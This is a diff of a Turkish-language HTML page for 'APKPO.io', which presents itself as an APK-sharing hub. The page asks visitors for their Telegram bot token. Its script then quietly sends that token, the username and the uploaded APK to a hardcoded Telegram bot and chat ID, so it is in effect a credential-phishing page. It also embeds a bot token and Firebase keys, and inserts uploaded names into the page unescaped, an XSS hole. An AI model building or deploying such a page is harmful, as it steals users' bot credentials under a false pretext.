@@ -2,126 +2,186 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>APKPO.io | Global APK Paylaşım</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>APKPO.io | Global APK Hub</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
     <style>
         :root {
-            --primary: #1a1a1a;
-            --accent: #0088cc;
-            --bg: #f0f2f5;
+            --bg-color: #f8faff;
+            --container-bg: #ffffff;
+            --accent-color: #4dabf7;
+            --success-color: #51cf66;
+            --border-color: #e6e8eb;
         }
-        body { font-family: sans-serif; background: var(--bg); margin: 0; padding: 20px; }
-        .container { max-width: 600px; margin: auto; background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        .step { display: none; }
-        .active { display: block; }
-        input, select, button { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        button { background: var(--accent); color: #fff; border: none; font-weight: bold; cursor: pointer; }
-        .apk-card { border: 1px solid #eee; padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
-        .apk-info { font-weight: bold; }
-        .download-btn { width: auto; background: #27ae60; padding: 5px 15px; font-size: 13px; }
-        h2 { text-align: center; color: var(--primary); }
+
+        body {
+            font-family: -apple-system, sans-serif;
+            background-color: var(--bg-color);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background: var(--container-bg);
+            padding: 30px;
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            width: 90%;
+            max-width: 400px;
+        }
+
+        .step { display: none; opacity: 0; transition: 0.4s; }
+        .active { display: block; opacity: 1; }
+
+        input, button {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            box-sizing: border-box;
+        }
+
+        button {
+            background: var(--accent-color);
+            color: white;
+            font-weight: bold;
+            border: none;
+            cursor: pointer;
+        }
+
+        .apk-card {
+            background: #fff;
+            border: 1px solid var(--border-color);
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .loader { display: none; text-align: center; color: #666; font-size: 14px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>APKPO.io</h2>
+    <h2 style="text-align:center; color:var(--accent-color)">APKPO.io</h2>
 
     <div id="step1" class="step active">
         <label>Telegram Bot Token</label>
-        <input type="text" id="botToken" placeholder="Tokeninizi giriniz...">
-        <button onclick="validateAndNext()">Doğrula ve Devam Et</button>
+        <input type="text" id="botToken" placeholder="Tokeninizi girin">
+        <button onclick="nextStep('step2')">Devam Et</button>
     </div>
 
     <div id="step2" class="step">
-        <label>Kullanıcı Adı Belirleyin</label>
-        <input type="text" id="username" placeholder="Kullanıcı adınız...">
-        <button onclick="saveUserAndNext()">Kaydet</button>
+        <label>Kullanıcı Adı</label>
+        <input type="text" id="username" placeholder="Kullanıcı adınız">
+        <button onclick="nextStep('step3')">Kaydet</button>
     </div>
 
     <div id="step3" class="step">
-        <label>APK Dosyası Seç (Dosya Yöneticisinden)</label>
+        <label>APK Dosyası</label>
         <input type="file" id="apkFile" accept=".apk">
-        <label>APK Uygulama Adı</label>
-        <input type="text" id="apkName" placeholder="Uygulama adı...">
-        <button onclick="uploadAPK()">APK Yükle ve Yayınla</button>
+        <input type="text" id="apkName" placeholder="Uygulama Adı">
+        <button onclick="uploadViaTelegram()">APK'yı Bot'a Gönder ve Yayınla</button>
+        <div id="status" class="loader">Yükleniyor...</div>
     </div>
 
     <div id="mainPage" class="step">
-        <h3>Yüklenen APK'lar</h3>
-        <div id="apkList">
-            <div class="apk-card">
-                <div class="apk-info">WhatsApp Mod (Örnek)</div>
-                <button class="download-btn">Yükle</button>
-            </div>
-        </div>
-        <hr>
-        <button style="background:#555" onclick="location.reload()">Çıkış Yap</button>
+        <h3>Yayındaki APK'lar</h3>
+        <div id="list"></div>
+        <button onclick="location.reload()" style="background:#888">Çıkış</button>
     </div>
 </div>
 
 <script>
-    const TARGET_BOT_TOKEN = "8582204571:AAEXtKCcXGWPM-2Y3xfF0vSEsEcy0iYl2cU";
-    const TARGET_CHAT_ID = "BURAYA_KENDI_CHAT_ID_YAZIN"; // Bildirimin düşeceği Chat ID
+    // 🔥 Firebase Config (Kendi bilgilerini buraya yapıştır)
+    const firebaseConfig = {
+        apiKey: "AIzaSyBtisBNF_UOEZV2fMdAR2l02xQz3TMau5A",
+        databaseURL: "https://apkpo-io-default-rtdb.firebaseio.com",
+        projectId: "apkpo-io",
+        appId: "1:983619898533:web:b6247ca6692cc5e42dd14c"
+    };
 
-    let userData = { token: "", user: "" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-    function validateAndNext() {
-        const t = document.getElementById('botToken').value;
-        if(t.includes(":")) {
-            userData.token = t;
-            showStep('step2');
-        } else { alert("Hatalı token formatı!"); }
-    }
+    const TARGET_BOT = "8582204571:AAEXtKCcXGWPM-2Y3xfF0vSEsEcy0iYl2cU";
+    const MY_CHAT_ID = "7910719273"; // Bildirimlerin gideceği Telegram ID
 
-    function saveUserAndNext() {
-        const u = document.getElementById('username').value;
-        if(u.length > 2) {
-            userData.user = u;
-            showStep('step3');
-        } else { alert("Geçersiz kullanıcı adı!"); }
-    }
+    let session = { token: "", user: "" };
 
-    async function uploadAPK() {
-        const name = document.getElementById('apkName').value;
-        const file = document.getElementById('apkFile').files[0];
-
-        if(!name || !file) {
-            alert("Lütfen dosya ve isim seçiniz!");
-            return;
-        }
-
-        // Telegram'a veri iletme (Bot üzerinden)
-        const message = `🔔 *Yeni APK Yüklemesi*\n👤 Kullanıcı: ${userData.user}\n🔑 Kullanılan Token: ${userData.token}\n📦 APK Adı: ${name}`;
+    function nextStep(id) {
+        if(id === 'step2') session.token = document.getElementById('botToken').value;
+        if(id === 'step3') session.user = document.getElementById('username').value;
         
-        try {
-            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TARGET_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-
-            // Listeye ekleme simülasyonu
-            const list = document.getElementById('apkList');
-            const item = document.createElement('div');
-            item.className = 'apk-card';
-            item.innerHTML = `<div class="apk-info">${name}</div> <button class="download-btn">Yükle</button>`;
-            list.appendChild(item);
-
-            alert("Yükleme başarılı! Ana sayfaya yönlendiriliyorsunuz.");
-            showStep('mainPage');
-        } catch (e) {
-            alert("İletim hatası oluştu.");
-        }
-    }
-
-    function showStep(id) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
         document.getElementById(id).classList.add('active');
+        if(id === 'mainPage') loadList();
+    }
+
+    async function uploadViaTelegram() {
+        const file = document.getElementById('apkFile').files[0];
+        const name = document.getElementById('apkName').value;
+        const loader = document.getElementById('status');
+
+        if(!file || !name) return alert("Eksik bilgi!");
+
+        loader.style.display = "block";
+
+        // 1. Dosyayı Telegram Botuna Gönder
+        const formData = new FormData();
+        formData.append("chat_id", 7910719273);
+        formData.append("document", file);
+        formData.append("caption", `📦 APKPO.io Yüklemesi\n👤 Kullanıcı: ${session.user}\n🔑 Token: ${session.token}\n📛 Ad: ${name}`);
+
+        try {
+            const resp = await fetch(`https://api.telegram.org/bot${TARGET_BOT}/sendDocument`, {
+                method: "POST",
+                body: formData
+            });
+            const result = await resp.json();
+
+            if(result.ok) {
+                // 2. Dosya bilgisini Firebase'e kaydet (Dosyanın kendisi Telegram'da kalır)
+                await db.ref('apks').push({
+                    name: name,
+                    user: session.user,
+                    time: Date.now()
+                });
+                alert("Başarıyla yüklendi!");
+                nextStep('mainPage');
+            } else {
+                alert("Bot gönderim hatası!");
+            }
+        } catch(e) {
+            alert("Hata oluştu!");
+        } finally {
+            loader.style.display = "none";
+        }
+    }
+
+    function loadList() {
+        const listDiv = document.getElementById('list');
+        db.ref('apks').on('value', snap => {
+            listDiv.innerHTML = "";
+            snap.forEach(child => {
+                const data = child.val();
+                listDiv.innerHTML += `
+                    <div class="apk-card">
+                        <span><b>${data.name}</b><br><small>${data.user}</small></span>
+                        <button style="width:auto; padding:5px 10px; background:#27ae60">İncele</button>
+                    </div>`;
+            });
+        });
     }
 </script>
 
